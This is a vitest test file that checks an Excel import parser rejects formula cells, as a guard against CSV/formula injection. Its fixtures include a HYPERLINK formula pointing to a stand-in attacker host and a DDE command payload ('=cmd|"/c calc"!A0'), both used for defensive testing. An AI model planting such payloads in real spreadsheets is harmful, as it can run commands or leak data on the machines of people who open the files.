/**
 * Test #2 — CSV / XLSX formula-injection guard on DATA rows.
 *
 * Audit-pass v2 finding C1 (HIGH). docs/03 §10 line 2124:
 *   "ExcelJS עם cellFormula: false למניעת formula injection"
 *
 * ExcelJS's load() API does not expose `cellFormula: false`. We
 * implement the functional equivalent at file-level: reject any
 * formula cell, header OR data.
 *
 * Threat model: a malicious owner-data file with
 *   national_id | phone | name                          | apartment | address
 *   123456782   | 0501… | =HYPERLINK("http://atk/?a=1") | 1         | Herzl
 * If we silently coerced the formula to its result string, the
 * Manager's error-export (S8) would re-emit the formula text into a
 * fresh xlsx; opening that file in Excel/LibreOffice would auto-eval
 * the formula. Classic CSV-injection. Strict reject prevents the
 * entire chain.
 *
 * Pinned invariants:
 *   1. data-row formula in any column → ExcelParserError('formula_in_data')
 *   2. data-row formula in FIRST data row (not header)
 *   3. data-row formula in LAST data row
 *   4. header formula still rejected as 'formula_in_header' (pre-existing)
 *   5. multiple data-row formulas — first one wins, reject deterministic
 *   6. formula evaluating to a "safe" result still rejected
 *   7. clean file with numeric/date cells still passes (no false positive)
 *   8. parseExcelHeader rejects data-row formulas too (earliest exit)
 *   9. discriminator code is stable for downstream NonRetryable wrap
 */
import { Readable } from 'node:stream';

import { Workbook } from 'exceljs';
import { describe, expect, it } from 'vitest';

import { ExcelParserError, parseExcelFull, parseExcelHeader } from '../src/parser/excel.parser';

async function build(
  rows: Array<Array<string | number | Date | null>>,
  inject?: (ws: import('exceljs').Worksheet) => void,
): Promise<Buffer> {
  const wb = new Workbook();
  const ws = wb.addWorksheet('Sheet1');
  for (const r of rows) ws.addRow(r.map((v) => (v == null ? null : v)));
  inject?.(ws);
  return Buffer.from(await wb.xlsx.writeBuffer());
}

const VALID_HEADERS = ['national_id', 'phone', 'name', 'apartment', 'address'];

describe('Test #2 — CSV-injection guard on data rows (audit-pass v2 C1)', () => {
  it('1) data-row formula in `name` column → formula_in_data', async () => {
    const buf = await build(
      [VALID_HEADERS, ['123456782', '0501234567', 'placeholder', '1', 'Herzl 10']],
      (ws) => {
        // Replace C2 (the `name` cell in the first data row) with a formula.
        const cell = ws.getCell('C2');
        cell.value = { formula: '=HYPERLINK("http://attacker/?a=1")', result: 'click here' };
      },
    );
    await expect(parseExcelFull(Readable.from(buf))).rejects.toMatchObject({
      name: 'ExcelParserError',
      code: 'formula_in_data',
    });
  });

  it('2) data-row formula in the FIRST data row (row 2)', async () => {
    const buf = await build(
      [
        VALID_HEADERS,
        ['placeholder', '0501234567', 'Avi', '1', 'Herzl 10'],
        ['234567899', '0521234567', 'Bob', '2', 'Herzl 10'],
      ],
      (ws) => {
        const cell = ws.getCell('A2');
        cell.value = { formula: '=A1', result: '123' };
      },
    );
    await expect(parseExcelFull(Readable.from(buf))).rejects.toMatchObject({
      code: 'formula_in_data',
    });
  });

  it('3) data-row formula in the LAST data row (still rejected)', async () => {
    const buf = await build(
      [
        VALID_HEADERS,
        ['123456782', '0501234567', 'Avi', '1', 'Herzl 10'],
        ['234567899', '0521234567', 'Bob', '2', 'Herzl 10'],
        ['placeholder', '0531234567', 'Carol', '3', 'Herzl 10'],
      ],
      (ws) => {
        const cell = ws.getCell('A4');
        cell.value = { formula: '=A3', result: '234' };
      },
    );
    await expect(parseExcelFull(Readable.from(buf))).rejects.toMatchObject({
      code: 'formula_in_data',
    });
  });

  it('4) header formula still rejected as formula_in_header (pre-existing)', async () => {
    const buf = await build(
      [VALID_HEADERS, ['123456782', '0501234567', 'Avi', '1', 'Herzl 10']],
      (ws) => {
        const cell = ws.getCell('B1');
        cell.value = { formula: '=SUM(1,2)', result: 3 };
      },
    );
    await expect(parseExcelFull(Readable.from(buf))).rejects.toMatchObject({
      code: 'formula_in_header',
    });
  });

  it('5) multiple formulas in different rows → reject is deterministic', async () => {
    const buf = await build(
      [
        VALID_HEADERS,
        ['placeholder', '0501234567', 'Avi', '1', 'Herzl 10'],
        ['placeholder', '0521234567', 'Bob', '2', 'Herzl 10'],
      ],
      (ws) => {
        ws.getCell('A2').value = { formula: '=1+1', result: 2 };
        ws.getCell('A3').value = { formula: '=2+2', result: 4 };
      },
    );
    await expect(parseExcelFull(Readable.from(buf))).rejects.toMatchObject({
      code: 'formula_in_data',
    });
  });

  it('6) formula whose RESULT is benign is still rejected (we never trust the result)', async () => {
    const buf = await build(
      [VALID_HEADERS, ['placeholder', '0501234567', 'Avi', '1', 'Herzl 10']],
      (ws) => {
        const cell = ws.getCell('A2');
        // Innocent-looking calculation. The formula text is the threat
        // — what re-emits on export, not the result.
        cell.value = { formula: '=1+1', result: 2 };
      },
    );
    await expect(parseExcelFull(Readable.from(buf))).rejects.toMatchObject({
      code: 'formula_in_data',
    });
  });

  it('7) clean file with numeric / date / Hebrew cells passes (no false positive)', async () => {
    const buf = await build([
      VALID_HEADERS,
      ['123456782', '0501234567', 'אבי', '1', 'הרצל 10'],
      [234567899, '0521234567', new Date('2020-01-01'), 2, 'Herzl 10'],
    ]);
    const out = await parseExcelFull(Readable.from(buf));
    expect(out.rowCount).toBe(2);
  });

  it('8) parseExcelHeader also rejects data-row formulas (earliest exit)', async () => {
    // The handler runs parseExcelHeader in parseStage and parseExcelFull
    // in validateStage. Both must reject so we don't waste a transition.
    const buf = await build(
      [VALID_HEADERS, ['placeholder', '0501234567', 'Avi', '1', 'Herzl 10']],
      (ws) => {
        ws.getCell('A2').value = { formula: '=A1', result: '123' };
      },
    );
    await expect(parseExcelHeader(Readable.from(buf))).rejects.toMatchObject({
      code: 'formula_in_data',
    });
  });

  it('9) error code is a stable string (downstream wraps as parse_formula_in_data)', async () => {
    const buf = await build(
      [VALID_HEADERS, ['placeholder', '0501234567', 'Avi', '1', 'Herzl 10']],
      (ws) => {
        ws.getCell('A2').value = { formula: '=A1', result: 'x' };
      },
    );
    try {
      await parseExcelFull(Readable.from(buf));
      throw new Error('expected throw');
    } catch (e) {
      expect(e).toBeInstanceOf(ExcelParserError);
      expect((e as ExcelParserError).code).toBe('formula_in_data');
      // Downstream contract — handler wraps as NonRetryable with this
      // exact code prefix. Test fixes the prefix so a future rename
      // gets caught.
      expect(`parse_${(e as ExcelParserError).code}`).toBe('parse_formula_in_data');
    }
  });

  it('10) CSV-injection attack patterns (=cmd, +cmd, -cmd, @cmd) all rejected as data-row formulas', async () => {
    // ExcelJS only stores `+/-/=/@` prefixed strings as plain text unless
    // an explicit formula is set. The threat is when a malicious user
    // explicitly authors a formula object in the xlsx XML. This test
    // covers the explicit-formula path (the only one ExcelJS surfaces
    // as `{ formula, result }`). The plain-text variants (a CELL whose
    // value is the string '=cmd') are NOT formulas to ExcelJS — they
    // get stringified and validated downstream by row-validator (which
    // would reject '=cmd' as not a valid national_id / phone / etc.).
    for (const formula of ['=cmd|"/c calc"!A0', '+SUM(A1)', '-1+2', '@SUM(A1)']) {
      const buf = await build(
        [VALID_HEADERS, ['placeholder', '0501234567', 'Avi', '1', 'Herzl 10']],
        (ws) => {
          ws.getCell('A2').value = { formula, result: 'click' };
        },
      );
      await expect(parseExcelFull(Readable.from(buf))).rejects.toMatchObject({
        code: 'formula_in_data',
      });
    }
  });
});
